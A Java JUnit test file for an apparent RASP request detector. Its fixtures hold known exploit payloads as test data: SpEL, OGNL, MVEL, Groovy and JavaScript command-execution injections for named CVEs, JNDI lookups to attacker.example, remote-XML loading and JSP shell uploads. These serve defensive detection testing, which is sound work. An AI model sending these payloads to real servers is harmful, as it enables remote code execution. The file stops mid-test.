package io.ohmyrasp.agent.detect;

import static io.ohmyrasp.agent.detect.DetectorTestSupport.assertAlgorithm;
import static io.ohmyrasp.agent.detect.DetectorTestSupport.jsonString;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

import io.ohmyrasp.agent.model.RequestContext;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;

/** Request expression, script configuration and template rules. */
final class RequestExpressionDetectorTest {
  private final DetectorEngine engine = new DetectorEngine();

  @Test
  void detectsServerSideScriptPutTrailingSlashBypass() {
    var context =
        new RequestContext("PUT", "/1.jsp/", "", Map.of(), Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_server_side_script_put");
    assertEquals("/1.jsp/", result.orElseThrow().details().get("path"));
  }

  @Test
  void detectsEncodedServerSideScriptPutPath() {
    var context =
        new RequestContext(
            "PUT", "/uploads/%73hell.jsp%2f", "", Map.of(), Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_server_side_script_put");
    assertEquals("/uploads/shell.jsp/", result.orElseThrow().details().get("path"));
  }

  @Test
  void ignoresServerSideScriptPathForReadOnlyRequest() {
    var context =
        new RequestContext("GET", "/index.jsp", "", Map.of(), Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsMultipartOgnlUploadFilenameOverrideTraversal() {
    var context =
        new RequestContext(
            "POST",
            "/index.action",
            "top.fileFileName=..%2Fshell.jsp",
            Map.of("top.fileFileName", List.of("../shell.jsp")),
            Map.of(
                "content-type",
                "multipart/form-data; boundary=----JUnit",
                "user-agent",
                "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_upload_filename_override");
    assertEquals("top.fileFileName", result.orElseThrow().details().get("parameter"));
  }

  @Test
  void detectsSchedulerShellJobDispatch() {
    var context =
        new RequestContext(
            "POST",
            "/run",
            "",
            Map.of(
                "jobId",
                List.of("1"),
                "executorHandler",
                List.of("demoJobHandler"),
                "executorParams",
                List.of("demoJobHandler"),
                "glueType",
                List.of("GLUE_SHELL"),
                "glueSource",
                List.of("touch /tmp/success"),
                "logId",
                List.of("1")),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_scheduler_shell_job");
    assertEquals("glueType", result.orElseThrow().details().get("typeParameter"));
    assertEquals("glueSource", result.orElseThrow().details().get("sourceParameter"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("glueSource"));
  }

  @Test
  void detectsSchedulerShellJobDispatchFromJsonBody() {
    String body =
        """
        {
          "jobId": "1",
          "executorHandler": "demoJobHandler",
          "executorParams": "demoJobHandler",
          "executorBlockStrategy": "COVER_EARLY",
          "glueType": "GLUE_SHELL",
          "glueSource": "touch /tmp/success"
        }
        """;
    var context =
        new RequestContext(
            "POST",
            "/run",
            "",
            Map.of(),
            Map.of("content-type", "application/json", "user-agent", "JUnit"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_scheduler_shell_job");
    assertEquals("body.glueType", result.orElseThrow().details().get("typeParameter"));
    assertEquals("body.glueSource", result.orElseThrow().details().get("sourceParameter"));
    assertEquals("18", result.orElseThrow().details().get("sourceLength"));
  }

  @Test
  void ignoresSchedulerDispatchWithNonShellJobType() {
    var context =
        new RequestContext(
            "POST",
            "/run",
            "",
            Map.of(
                "jobId",
                List.of("1"),
                "executorHandler",
                List.of("demoJobHandler"),
                "glueType",
                List.of("BEAN"),
                "glueSource",
                List.of("normal handler")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresShellFieldsOutsideSchedulerShape() {
    var context =
        new RequestContext(
            "POST",
            "/api/render",
            "",
            Map.of("scriptType", List.of("shell"), "script", List.of("echo report")),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresShellJsonFieldsOutsideSchedulerShape() {
    String body =
        """
        {"glueType":"GLUE_SHELL","glueSource":"echo report","description":"normal renderer"}
        """;
    var context =
        new RequestContext(
            "POST",
            "/api/render",
            "",
            Map.of(),
            Map.of("content-type", "application/json", "user-agent", "JUnit"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsGatewayRouteDynamicScriptConfig() {
    var routeConfig =
        """
        {"filters":[{"name":"AddResponseHeader","args":{"value":"#{T(java.lang.Runtime).getRuntime().exec('id')}"}}],"uri":"http://example.com"}
        """;
    var context =
        new RequestContext(
            "POST",
            "/actuator/gateway/routes/hacktest",
            "",
            Map.of("routeConfig", List.of(routeConfig)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("routeConfig", result.orElseThrow().details().get("parameter"));
    assertEquals("spel", result.orElseThrow().details().get("engine"));
  }

  @Test
  void detectsSpringCve202222947GatewayRouteJsonBodySpelConfig() {
    var body =
        """
        {
          "id": "hacktest",
          "filters": [{
            "name": "AddResponseHeader",
            "args": {
              "name": "Result",
              "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"id\\"}).getInputStream()))}"
            }
          }],
          "uri": "http://example.com"
        }
        """;
    var context =
        new RequestContext(
            "POST",
            "/actuator/gateway/routes/hacktest",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("body.value", result.orElseThrow().details().get("parameter"));
    assertEquals("spel", result.orElseThrow().details().get("engine"));
  }

  @Test
  void detectsSolrCve20190193DataImportDynamicScriptConfig() {
    var dataConfig =
        """
        <dataConfig>
          <script><![CDATA[
            function poc(){ java.lang.Runtime.getRuntime().exec("touch /tmp/success"); }
          ]]></script>
          <document><entity name="sample" transformer="script:poc"/></document>
        </dataConfig>
        """;
    var context =
        new RequestContext(
            "POST",
            "/solr/demo/dataimport",
            "command=full-import",
            Map.of("command", List.of("full-import"), "dataConfig", List.of(dataConfig)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("dataConfig", result.orElseThrow().details().get("parameter"));
    assertEquals("javascript", result.orElseThrow().details().get("engine"));
  }

  @Test
  void detectsElasticsearchCve20143120MvelSearchScriptField() {
    var script =
        "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\")"
            + ".getInputStream()).useDelimiter(\"\\\\A\").next();";
    var body =
        """
        {"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"command":{"script":"%s"}}}
        """
            .formatted(jsonString(script));
    var context =
        new RequestContext(
            "POST",
            "/_search",
            "pretty",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("body.script", result.orElseThrow().details().get("parameter"));
    assertEquals("mvel", result.orElseThrow().details().get("engine"));
    assertEquals(String.valueOf(script.length()), result.orElseThrow().details().get("sourceLength"));
    assertTrue(result.orElseThrow().request().body().isBlank());
  }

  @Test
  void detectsElasticsearchCve20151427GroovySearchScriptField() {
    var script =
        "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()";
    var body =
        "{\"size\":1,\"script_fields\":{\"lupin\":{\"lang\":\"groovy\",\"script\":\""
            + jsonString(script)
            + "\"}}}";
    var context =
        new RequestContext(
            "POST",
            "/_search",
            "pretty",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/text"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("body.script", result.orElseThrow().details().get("parameter"));
    assertEquals("groovy", result.orElseThrow().details().get("engine"));
    assertEquals(String.valueOf(script.length()), result.orElseThrow().details().get("sourceLength"));
  }

  @Test
  void ignoresBenignElasticsearchGroovySearchScriptField() {
    var script = "doc['name'].value";
    var body =
        "{\"size\":1,\"script_fields\":{\"name\":{\"lang\":\"groovy\",\"script\":\""
            + jsonString(script)
            + "\"}}}";
    var context =
        new RequestContext(
            "POST",
            "/_search",
            "pretty",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/text"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsHugeGraphGremlinReflectiveProcessBuilderDynamicScriptConfig() {
    var script = hugeGraphGremlinScript();
    var body =
        """
        {"gremlin":"%s","bindings":{},"language":"gremlin-groovy","aliases":{}}
        """
            .formatted(jsonString(script));
    var context =
        new RequestContext(
            "POST",
            "/gremlin",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("body.gremlin", result.orElseThrow().details().get("parameter"));
    assertEquals("groovy", result.orElseThrow().details().get("engine"));
    assertEquals(String.valueOf(script.length()), result.orElseThrow().details().get("sourceLength"));
    assertTrue(result.orElseThrow().request().body().isBlank());
  }

  @Test
  void ignoresBenignHugeGraphGremlinTraversalDynamicScriptConfig() {
    var body =
        """
        {"gremlin":"g.V().hasLabel('person').limit(10)","bindings":{},"language":"gremlin-groovy","aliases":{}}
        """;
    var context =
        new RequestContext(
            "POST",
            "/gremlin",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsJenkinsGroovyCheckScriptDynamicScriptConfig() {
    var script = "public class x { public x(){ \"touch /tmp/success\".execute() } }";
    var context =
        new RequestContext(
            "GET",
            "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript",
            "sandbox=true&value=" + script,
            Map.of("sandbox", List.of("true"), "value", List.of(script)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("value", result.orElseThrow().details().get("parameter"));
    assertEquals("groovy", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(script.length()), result.orElseThrow().details().get("sourceLength"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("value"));
    assertEquals("sandbox=true&value=[redacted]", result.orElseThrow().request().query());
  }

  @Test
  void detectsOfbizProgramExportUnicodeGroovyDynamicScriptConfig() {
    var script = "throw new Exception('id'.\\u0065xecute().text);";
    var decodedScript = "throw new Exception('id'.execute().text);";
    var context =
        new RequestContext(
            "POST",
            "/webtools/control/main/ProgramExport",
            "groovyProgram=throw+new+Exception('id'.%5Cu0065xecute().text)%3B",
            Map.of("groovyProgram", List.of(script)),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("groovyProgram", result.orElseThrow().details().get("parameter"));
    assertEquals("groovy", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(decodedScript.length()), result.orElseThrow().details().get("sourceLength"));
    assertEquals(
        List.of("[redacted]"), result.orElseThrow().request().parameters().get("groovyProgram"));
    assertEquals("groovyProgram=[redacted]", result.orElseThrow().request().query());
  }

  @Test
  void ignoresBenignOfbizProgramExportGroovyDynamicScriptConfig() {
    var script = "return 'hello'.toUpperCase();";
    var context =
        new RequestContext(
            "POST",
            "/webtools/control/main/ProgramExport",
            "groovyProgram=return+'hello'.toUpperCase()%3B",
            Map.of("groovyProgram", List.of(script)),
            Map.of("user-agent", "JUnit", "content-type", "application/x-www-form-urlencoded"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresBenignJenkinsGroovyCheckScriptDynamicScriptConfig() {
    var script = "public class x { String ok(){ return \"hello\".toUpperCase() } }";
    var context =
        new RequestContext(
            "GET",
            "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript",
            "sandbox=true&value=" + script,
            Map.of("sandbox", List.of("true"), "value", List.of(script)),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresGroovyExecuteOutsideDynamicScriptConfigContext() {
    var script = "public class x { public x(){ \"touch /tmp/success\".execute() } }";
    var context =
        new RequestContext(
            "POST",
            "/api/comments",
            "value=" + script,
            Map.of("value", List.of(script)),
            Map.of("user-agent", "JUnit"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsAjReportValidationRulesBodyDynamicScriptConfig() {
    var script =
        "function verification(data){a = new java.lang.ProcessBuilder(\"id\")"
            + ".start().getInputStream();return a;}";
    var body =
        "{\"ParamName\":\"\",\"sampleItem\":\"1\",\"validationRules\":\"" + jsonString(script) + "\"}";
    var context =
        new RequestContext(
            "POST",
            "/dataSetParam/verification;swagger-ui/",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json;charset=UTF-8"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("body.validationRules", result.orElseThrow().details().get("parameter"));
    assertEquals("javascript", result.orElseThrow().details().get("engine"));
    assertEquals(String.valueOf(script.length()), result.orElseThrow().details().get("sourceLength"));
  }

  @Test
  void detectsDruidSamplerJavascriptFunctionBodyDynamicScriptConfig() {
    var script =
        "function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime()"
            + ".exec([\"sh\",\"-c\",\"id\"]).getInputStream()).useDelimiter(\"\\\\A\").next();"
            + "return {timestamp:123123,test:a}}";
    var body =
        """
        {
          "type": "index",
          "spec": {
            "dataSchema": {
              "parser": {
                "parseSpec": {
                  "format": "javascript",
                  "function": "%s",
                  "": {"enabled": "true"}
                }
              }
            }
          }
        }
        """
            .formatted(jsonString(script));
    var context =
        new RequestContext(
            "POST",
            "/druid/indexer/v1/sampler",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("body.function", result.orElseThrow().details().get("parameter"));
    assertEquals("javascript", result.orElseThrow().details().get("engine"));
    assertEquals(String.valueOf(script.length()), result.orElseThrow().details().get("sourceLength"));
  }

  @Test
  void detectsUnomiMvelContextJsonDynamicScriptConfig() {
    var script = "script::Runtime r = Runtime.getRuntime(); r.exec(\"touch /tmp/mvel\");";
    var body =
        """
        {
          "filters": [{
            "id": "sample",
            "filters": [{
              "condition": {
                "parameterValues": {
                  "": "%s"
                },
                "type": "profilePropertyCondition"
              }
            }]
          }],
          "sessionId": "sample"
        }
        """
            .formatted(jsonString(script));
    var context =
        new RequestContext(
            "POST",
            "/context.json",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("body.<unnamed>", result.orElseThrow().details().get("parameter"));
    assertEquals("mvel", result.orElseThrow().details().get("engine"));
    assertEquals(String.valueOf(script.length()), result.orElseThrow().details().get("sourceLength"));
  }

  @Test
  void detectsUnomiOgnlContextJsonDynamicScriptConfig() {
    var expression =
        "(#runtimeclass = #this.getClass().forName(\"java.lang.Runtime\"))"
            + ".(#getruntimemethod = #runtimeclass.getDeclaredMethods().{^ #this.name.equals(\"getRuntime\")}[0])"
            + ".(#rtobj = #getruntimemethod.invoke(null,null))"
            + ".(#execmethod = #runtimeclass.getDeclaredMethods().{? #this.name.equals(\"exec\")}[0])"
            + ".(#execmethod.invoke(#rtobj,\"touch /tmp/ognl\"))";
    var body =
        """
        {
          "personalizations": [{
            "contents": [{
              "filters": [{
                "condition": {
                  "parameterValues": {
                    "propertyName": "%s",
                    "comparisonOperator": "equals",
                    "propertyValue": "male"
                  },
                  "type": "profilePropertyCondition"
                }
              }]
            }]
          }],
          "sessionId": "sample"
        }
        """
            .formatted(jsonString(expression));
    var context =
        new RequestContext(
            "POST",
            "/context.json",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("body.propertyName", result.orElseThrow().details().get("parameter"));
    assertEquals("ognl", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expression.length()), result.orElseThrow().details().get("sourceLength"));
  }

  @Test
  void detectsMetabaseH2InitJsonDynamicScriptConfig() {
    var init =
        "CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\n"
            + "java.lang.Runtime.getRuntime().exec('touch /tmp/success')\n$$";
    var body =
        """
        {
          "token": "setup-token",
          "details": {
            "details": {
              "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;",
              "init": "%s"
            },
            "engine": "h2"
          }
        }
        """
            .formatted(jsonString(init).replace("\n", "\\n"));
    var context =
        new RequestContext(
            "POST",
            "/api/setup/validate",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("body.init", result.orElseThrow().details().get("parameter"));
    assertEquals("javascript", result.orElseThrow().details().get("engine"));
    assertEquals(String.valueOf(init.length()), result.orElseThrow().details().get("sourceLength"));
  }

  @Test
  void ignoresBenignMetabaseH2InitJsonDynamicScriptConfig() {
    var body =
        """
        {
          "token": "setup-token",
          "details": {
            "details": {
              "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;",
              "init": "SET MODE MSSQLServer"
            },
            "engine": "h2"
          }
        }
        """;
    var context =
        new RequestContext(
            "POST",
            "/api/setup/validate",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsH2ConsoleJdbcInitUrlDynamicScriptConfig() {
    var jdbcUrl =
        "jdbc:h2:mem:test;MODE=MSSQLServer;FORBID_CREATION=FALSE;"
            + "INIT=CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\n"
            + "java.lang.Runtime.getRuntime().exec(\"id\")\n$$;AUTHZPWD=\\";
    var context =
        new RequestContext(
            "POST",
            "/h2-console/login.do",
            "driver=org.h2.Driver&url=" + jdbcUrl,
            Map.of("driver", List.of("org.h2.Driver"), "url", List.of(jdbcUrl)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("url", result.orElseThrow().details().get("parameter"));
    assertEquals("h2", result.orElseThrow().details().get("engine"));
    assertEquals(String.valueOf(jdbcUrl.length()), result.orElseThrow().details().get("sourceLength"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("url"));
    assertTrue(result.orElseThrow().request().query().contains("url=[redacted]"));
  }

  @Test
  void detectsWebLogicConsoleShellSessionHandleDynamicScriptConfig() {
    var handle =
        "com.tangosol.coherence.mvel2.sh.ShellSession("
            + "\"java.lang.Runtime.getRuntime().exec('touch /tmp/success1');\")";
    var context =
        new RequestContext(
            "GET",
            "/console/css/console.portal",
            "_nfpb=true&_pageLabel=&handle=" + handle,
            Map.of("_nfpb", List.of("true"), "_pageLabel", List.of(""), "handle", List.of(handle)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("handle", result.orElseThrow().details().get("parameter"));
    assertEquals("mvel", result.orElseThrow().details().get("engine"));
    assertEquals(String.valueOf(handle.length()), result.orElseThrow().details().get("sourceLength"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("handle"));
    assertTrue(result.orElseThrow().request().query().contains("handle=[redacted]"));
  }

  @Test
  void detectsWebLogicConsoleRemoteSpringHandleDynamicScriptConfig() {
    var handle =
        "com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext"
            + "(\"http://example.com/rce.xml\")";
    var context =
        new RequestContext(
            "GET",
            "/console/css/console.portal",
            "_nfpb=true&_pageLabel=&handle=" + handle,
            Map.of("_nfpb", List.of("true"), "_pageLabel", List.of(""), "handle", List.of(handle)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("handle", result.orElseThrow().details().get("parameter"));
    assertEquals("spring", result.orElseThrow().details().get("engine"));
    assertEquals(String.valueOf(handle.length()), result.orElseThrow().details().get("sourceLength"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("handle"));
    assertTrue(result.orElseThrow().request().query().contains("handle=[redacted]"));
  }

  @Test
  void detectsDataEaseBase64H2DatasourceConfigDynamicScriptConfig() {
    var configuration = dataEaseH2Configuration();
    var encoded = Base64.getEncoder().encodeToString(configuration.getBytes(StandardCharsets.UTF_8));
    var body = "{\"name\":\"p1\",\"type\":\"h2\",\"configuration\":\"" + encoded + "\"}";
    var context =
        new RequestContext(
            "POST",
            "/de2api/datasource/validate",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("body.configuration", result.orElseThrow().details().get("parameter"));
    assertEquals("h2", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(configuration.length()), result.orElseThrow().details().get("sourceLength"));
  }

  @Test
  void detectsDataEaseBase64H2DatasourceConfigParameterAndRedactsIt() {
    var configuration = dataEaseH2Configuration();
    var encoded = Base64.getEncoder().encodeToString(configuration.getBytes(StandardCharsets.UTF_8));
    var context =
        new RequestContext(
            "POST",
            "/de2api/datasource/validate",
            "configuration=" + encoded,
            Map.of("configuration", List.of(encoded)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("configuration", result.orElseThrow().details().get("parameter"));
    assertEquals("h2", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(configuration.length()), result.orElseThrow().details().get("sourceLength"));
    assertEquals(
        List.of("[redacted]"), result.orElseThrow().request().parameters().get("configuration"));
    assertEquals("configuration=[redacted]", result.orElseThrow().request().query());
  }

  @Test
  void ignoresDataEaseBase64H2DatasourceConfigOutsideValidationPath() {
    var configuration = dataEaseH2Configuration();
    var encoded = Base64.getEncoder().encodeToString(configuration.getBytes(StandardCharsets.UTF_8));
    var body = "{\"configuration\":\"" + encoded + "\"}";
    var context =
        new RequestContext(
            "POST",
            "/api/comments",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsDruidSamplerJavascriptRuntimeConfig() {
    var function =
        "function(){return java.lang.Runtime.getRuntime().exec(new String[]{\"sh\",\"-c\",\"id\"});}";
    var body =
        """
        {
          "type": "index",
          "spec": {
            "dataSchema": {
              "parser": {
                "parseSpec": {
                  "format": "javascript",
                  "function": "%s",
                  "": {"enabled": "true"}
                }
              }
            }
          },
          "samplerConfig": {"numRows": 10}
        }
        """
            .formatted(jsonString(function));
    var context =
        new RequestContext(
            "POST",
            "/druid/indexer/v1/sampler",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_dynamic_script_config");
    assertEquals("body.function", result.orElseThrow().details().get("parameter"));
    assertEquals("javascript", result.orElseThrow().details().get("engine"));
    assertEquals(String.valueOf(function.length()), result.orElseThrow().details().get("sourceLength"));
  }

  @Test
  void ignoresBenignDynamicScriptBody() {
    var body =
        """
        {"type":"index","spec":{"dataSchema":{"parser":{"parseSpec":{
          "format":"javascript",
          "function":"function(row){ return {timestamp: row.time, value: row.value}; }"
        }}}}}
        """;
    var context =
        new RequestContext(
            "POST",
            "/druid/indexer/v1/sampler",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsSpringMessagingStompSelectorExpression() {
    var selector = "T(java.lang.Runtime).getRuntime().exec('touch /tmp/success')";
    var body =
        "[\"SUBSCRIBE\\nid:sub-0\\ndestination:/topic/greetings\\nselector:"
            + selector
            + "\\n\\n\\u0000\"]";
    var context =
        new RequestContext(
            "POST",
            "/gs-guide-websocket/123/abc/xhr_send",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_message_selector_expression");
    assertEquals("spel", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(selector.length()), result.orElseThrow().details().get("selectorLength"));
    assertTrue(result.orElseThrow().request().body().isBlank());
  }

  @Test
  void ignoresBenignStompSelectorExpression() {
    var body =
        "[\"SUBSCRIBE\\nid:sub-0\\ndestination:/topic/greetings"
            + "\\nselector:headers['tenant'] == 'acme'\\n\\n\\u0000\"]";
    var context =
        new RequestContext(
            "POST",
            "/gs-guide-websocket/123/abc/xhr_send",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", "application/json"),
            body);

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void detectsRuntimeExpressionHeader() {
    var expression = "T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/success\")";
    var context =
        new RequestContext(
            "POST",
            "/functionRouter",
            "",
            Map.of(),
            Map.of(
                "user-agent",
                "JUnit",
                "spring.cloud.function.routing-expression",
                expression));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_header");
    assertEquals(
        "spring.cloud.function.routing-expression", result.orElseThrow().details().get("header"));
    assertEquals("spel", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expression.length()), result.orElseThrow().details().get("expressionLength"));
    assertEquals(
        "[redacted]",
        result.orElseThrow().request().headers().get("spring.cloud.function.routing-expression"));
  }

  @Test
  void detectsSpringCve202222963FunctionRouterRoutingExpressionHeader() {
    var expression = "T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/success\")";
    var context =
        new RequestContext(
            "POST",
            "/functionRouter",
            "",
            Map.of(),
            Map.of(
                "user-agent",
                "JUnit",
                "content-type",
                "text/plain",
                "spring.cloud.function.routing-expression",
                expression),
            "test");

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_header");
    assertEquals(
        "spring.cloud.function.routing-expression", result.orElseThrow().details().get("header"));
    assertEquals("[redacted]", result.orElseThrow().request().headers().get("spring.cloud.function.routing-expression"));
  }

  @Test
  void detectsOgnlContentTypeExpressionHeader() {
    var expression =
        "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']"
            + ".addHeader('vulhub',233*233)}.multipart/form-data";
    var context =
        new RequestContext(
            "POST",
            "/",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "content-type", expression));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_expression_header");
    assertEquals("content-type", result.orElseThrow().details().get("header"));
    assertEquals("ognl", result.orElseThrow().details().get("engine"));
    assertEquals(
        String.valueOf(expression.length()), result.orElseThrow().details().get("expressionLength"));
    assertEquals("[redacted]", result.orElseThrow().request().headers().get("content-type"));
  }

  @Test
  void ignoresBenignExpressionHeader() {
    var context =
        new RequestContext(
            "POST",
            "/functionRouter",
            "",
            Map.of(),
            Map.of(
                "user-agent",
                "JUnit",
                "spring.cloud.function.routing-expression",
                "headers['route'] ?: 'uppercase'"));

    assertTrue(engine.detectRequest(context).isEmpty());
  }

  @Test
  void ignoresBenignParserAndNonParserExpressionHeaders() {
    var contentTypeContext =
        new RequestContext(
            "POST",
            "/upload",
            "",
            Map.of(),
            Map.of(
                "user-agent",
                "JUnit",
                "content-type",
                "multipart/form-data; boundary=----WebKitFormBoundary"));
    var displayHeaderContext =
        new RequestContext(
            "GET",
            "/profile",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "x-note", "%{profile.displayName}"));

    assertTrue(engine.detectRequest(contentTypeContext).isEmpty());
    assertTrue(engine.detectRequest(displayHeaderContext).isEmpty());
  }

  @Test
  void detectsRequestJndiLookupParameter() {
    var payload = "${jndi:ldap://${sys:java.version}.example.com}";
    var context =
        new RequestContext(
            "GET",
            "/solr/admin/cores",
            "action=" + payload,
            Map.of("action", List.of(payload)),
            Map.of("user-agent", "JUnit"));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_jndi_lookup");
    assertEquals("parameter", result.orElseThrow().details().get("source"));
    assertEquals("action", result.orElseThrow().details().get("name"));
    assertEquals("ldap", result.orElseThrow().details().get("protocol"));
    assertEquals(
        String.valueOf(payload.length()), result.orElseThrow().details().get("valueLength"));
    assertEquals(List.of("[redacted]"), result.orElseThrow().request().parameters().get("action"));
    assertEquals("action=[redacted]", result.orElseThrow().request().query());
  }

  @Test
  void detectsObfuscatedRequestJndiLookupHeader() {
    var payload = "${${::-j}${::-n}${::-d}${::-i}:rmi://attacker.example/a}";
    var context =
        new RequestContext(
            "GET",
            "/",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "x-api-version", payload));

    var result = engine.detectRequest(context);

    assertAlgorithm(result, "request_jndi_lookup");
    assertEquals("header", result.orElseThrow().details().get("source"));
